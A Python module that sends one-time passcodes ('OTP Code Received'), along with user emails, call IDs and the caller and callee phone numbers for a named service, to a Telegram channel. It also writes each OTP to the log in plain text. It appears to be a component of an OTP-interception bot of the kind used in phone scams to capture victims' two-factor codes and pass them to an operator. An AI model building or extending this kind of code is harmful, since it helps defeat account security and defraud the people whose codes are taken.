from telegram import Bot
import os
import logging
from typing import Optional

logger = logging.getLogger(__name__)

class TelegramService:
    def __init__(self):
        self.bot_token = os.getenv('TELEGRAM_BOT_TOKEN')
        self.channel_id = os.getenv('TELEGRAM_CHANNEL_ID')
        self.bot = Bot(token=self.bot_token)
    
    async def send_otp_to_channel(self, otp_code: str, call_id: str, user_email: str):
        """Send OTP code to Telegram channel"""
        try:
            message = f"""
🔐 **OTP Code Received**

**Call ID:** `{call_id}`
**User:** {user_email}
**OTP Code:** `{otp_code}`
**Time:** {self._get_current_time()}

✅ Code forwarded successfully
            """
            
            await self.bot.send_message(
                chat_id=self.channel_id,
                text=message,
                parse_mode='Markdown'
            )
            
            logger.info(f"OTP {otp_code} forwarded to Telegram channel for call {call_id}")
            return True
        except Exception as e:
            logger.error(f"Error sending to Telegram: {e}")
            return False
    
    async def send_call_notification(self, call_data: dict):
        """Send call start notification to channel"""
        try:
            message = f"""
📞 **New Call Initiated**

**From:** {call_data.get('from_number')}
**To:** {call_data.get('to_number')}
**Service:** {call_data.get('service_name')}
**Type:** {call_data.get('call_type').upper()}
**Call ID:** `{call_data.get('call_id')}`
            """
            
            await self.bot.send_message(
                chat_id=self.channel_id,
                text=message,
                parse_mode='Markdown'
            )
            return True
        except Exception as e:
            logger.error(f"Error sending call notification: {e}")
            return False
    
    def _get_current_time(self):
        from datetime import datetime
        return datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')